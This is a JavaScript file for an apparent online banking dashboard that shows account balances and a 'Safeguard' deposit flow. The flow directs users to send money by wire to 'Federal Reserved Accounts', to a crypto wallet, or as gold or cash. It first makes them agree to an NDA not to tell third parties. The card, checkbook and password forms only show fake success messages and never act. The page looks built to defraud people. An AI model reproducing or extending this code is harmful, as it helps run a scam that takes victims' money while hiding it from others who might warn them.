// ==================== CONFIG ====================
const SUPABASE_URL = "https://hafzffbdqlojkuhgfsvy.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhhZnpmZmJkcWxvamt1aGdmc3Z5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkxOTA0NTksImV4cCI6MjA3NDc2NjQ1OX0.fYBo6l_W1lYE_sGnaxRZyroXHac1b1sXqxgJkqT5rnk";
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ==================== ELEMENTS ====================
const pfWelcome = document.getElementById("pf-welcome");
const totalBalanceEl = document.getElementById("totalBalance");
const accountCountEl = document.getElementById("accountCount");
const accountCards = document.getElementById("accountCards");

// ==================== SESSION RESTORE ====================
async function restoreSession() {
  const { data, error } = await supabase.auth.getSession();
  if (error || !data.session) {
    window.location.href = "index.html";
    return;
  }
  loadUser(data.session.user);
  loadAccounts(data.session.user);
}

supabase.auth.onAuthStateChange(async (event, session) => {
  if (event === "SIGNED_OUT") {
    window.location.href = "index.html";
  } else if (session) {
    loadUser(session.user);
    loadAccounts(session.user);
  }
});

// ==================== USER PROFILE ====================
async function loadUser(user) {
  try {
    const { data, error } = await supabase
      .from("profiles")
      .select("full_name")
      .eq("id", user.id)
      .single();

    if (error) throw error;
    pfWelcome.textContent = data?.full_name
      ? data.full_name.replace(/\b\w/g, (c) => c.toUpperCase())
      : "Valued Member";
  } catch (err) {
    console.error("Profile fetch failed:", err.message);
  }
}

// ==================== ACCOUNT CARDS ====================
async function loadAccounts(user) {
  try {
    const { data, error } = await supabase
      .from("accounts")
      .select("id, type, account_number, balance")
      .eq("user_id", user.id);

    if (error) throw error;

    if (!data || data.length === 0) {
      accountCards.innerHTML = `<p class="muted txt-small">No accounts found.</p>`;
      totalBalanceEl.textContent = "$0.00";
      accountCountEl.textContent = "0";
      return;
    }

    let total = 0;
    accountCards.innerHTML = data
      .map((acc) => {
        total += acc.balance;
        return `
          <div class="account-card">
            <div class="ac-top">
              <div>
                <div class="ac-type">${acc.type}</div>
                <div class="ac-number">${acc.account_number}</div>
              </div>
              <div class="ac-balance">$${acc.balance.toLocaleString()}</div>
            </div>
          </div>
        `;
      })
      .join("");

    totalBalanceEl.textContent = `$${total.toLocaleString()}`;
    accountCountEl.textContent = data.length;
  } catch (err) {
    console.error("Error loading accounts:", err.message);
  }
}

// ==================== MODALS ====================
function openModal(id) {
  document.getElementById(id).setAttribute("aria-hidden", "false");
}
function closeModal(id) {
  document.getElementById(id).setAttribute("aria-hidden", "true");
}
document.querySelectorAll("[data-close]").forEach((btn) =>
  btn.addEventListener("click", () =>
    btn.closest(".modal").setAttribute("aria-hidden", "true")
  )
);

// ==================== BUTTONS ====================
document.getElementById("openRequestDebit").onclick = () => openModal("requestDebitModal");
document.getElementById("openRequestCheck").onclick = () => openModal("requestCheckModal");
document.getElementById("openChangePassword").onclick = () => openModal("changePasswordModal");
document.getElementById("openContact").onclick = () => openModal("supportModal");
document.getElementById("openSafeguardBtn").onclick = () => openModal("safeguardModal");
document.getElementById("addMoneyBtn").onclick = () => openModal("safeguardModal");

// ==================== SAFEGUARD FLOW ====================
const safeguardBody = document.getElementById("safeguardBody");

const safeguardOptions = [
  { id: "wire_transfer", name: "Wire Transfer" },
  { id: "crypto", name: "Digital Asset (Crypto)" },
  { id: "gold", name: "Physical Asset (Gold)" },
  { id: "cash", name: "Certified Cash" },
];

// Initial Safeguard Options
function renderSafeguardOptions() {
  safeguardBody.innerHTML = safeguardOptions
    .map(
      (opt) => `
    <button class="btn-ghost w-full mt-2" data-method="${opt.id}">
      ${opt.name}
    </button>
  `
    )
    .join("");

  document.querySelectorAll("[data-method]").forEach((btn) =>
    btn.addEventListener("click", () => showNDA(btn.dataset.method))
  );
}

// NDA Disclaimer Step
function showNDA(method) {
  safeguardBody.innerHTML = `
    <p class="txt-small muted mb-3">Before proceeding, you must agree to the Non-Disclosure Agreement (NDA) to view secure deposit instructions.</p>
    <label class="txt-small"><input type="checkbox" id="chkNDA1" /> I understand the confidentiality of this information.</label><br>
    <label class="txt-small"><input type="checkbox" id="chkNDA2" /> I agree not to share these details with any third party.</label>
    <div class="btn-row mt-4">
      <button class="btn-primary" id="continueNDA">Continue</button>
      <button class="btn-ghost" id="backSafeguard">Back</button>
    </div>
  `;

  document.getElementById("backSafeguard").onclick = renderSafeguardOptions;
  document.getElementById("continueNDA").onclick = () => {
    const c1 = document.getElementById("chkNDA1").checked;
    const c2 = document.getElementById("chkNDA2").checked;
    if (!c1 || !c2) {
      alert("Please accept the NDA to continue.");
      return;
    }
    showDepositInstructions(method);
  };
}

// Final Deposit Instructions
function showDepositInstructions(method) {
  let content = "";
  switch (method) {
    case "wire_transfer":
      content = `
        <h4 class="font-semibold">Wire Transfer Instructions</h4>
        <p class="txt-small">Account Name: Federal Reserved Accounts<br>
        Bank: Federal Reserve Bank<br>
        Routing: 026009593<br>
        Account: 874639201</p>`;
      break;
    case "crypto":
      content = `
        <h4 class="font-semibold">Crypto Deposit</h4>
        <p class="txt-small">Scan or send to wallet address below:</p>
        <img src="images/crypto-wallet-qr.png" style="width:140px;margin-top:8px"/>
        <p class="txt-small">Wallet Address: <br> bc1qxyzabc123exampleaddress</p>`;
      break;
    case "gold":
      content = `
        <h4 class="font-semibold">Gold Deposit</h4>
        <p class="txt-small">Certified bullion may be securely delivered to our depository center. Contact support for shipping instructions.</p>`;
      break;
    case "cash":
      content = `
        <h4 class="font-semibold">Certified Cash Deposit</h4>
        <p class="txt-small">Cash deposits are only accepted through an approved financial officer. Request verification via Support.</p>`;
      break;
  }

  safeguardBody.innerHTML = `
    ${content}
    <div class="btn-row mt-4">
      <button class="btn-ghost" id="closeSafeguard">Close</button>
    </div>
  `;
  document.getElementById("closeSafeguard").onclick = () => closeModal("safeguardModal");
}

// ==================== FORMS ====================
function showResult(id, message) {
  const r = document.getElementById(id);
  r.style.display = "block";
  r.textContent = message;
}

document.getElementById("debitCardForm").addEventListener("submit", (e) => {
  e.preventDefault();
  showResult("debitResult", "✅ Your Secure Card request has been submitted.");
});

document.getElementById("checkbookForm").addEventListener("submit", (e) => {
  e.preventDefault();
  showResult("checkbookResult", "✅ Your Checkbook request has been submitted.");
});

document.getElementById("passwordForm").addEventListener("submit", (e) => {
  e.preventDefault();
  showResult("passwordResult", "✅ Password updated successfully.");
});

// ==================== LOGOUT ====================
document.getElementById("logoutBtnSidebar").addEventListener("click", async () => {
  await supabase.auth.signOut();
  window.location.href = "index.html";
});

// ==================== INIT ====================
renderSafeguardOptions();
restoreSession();
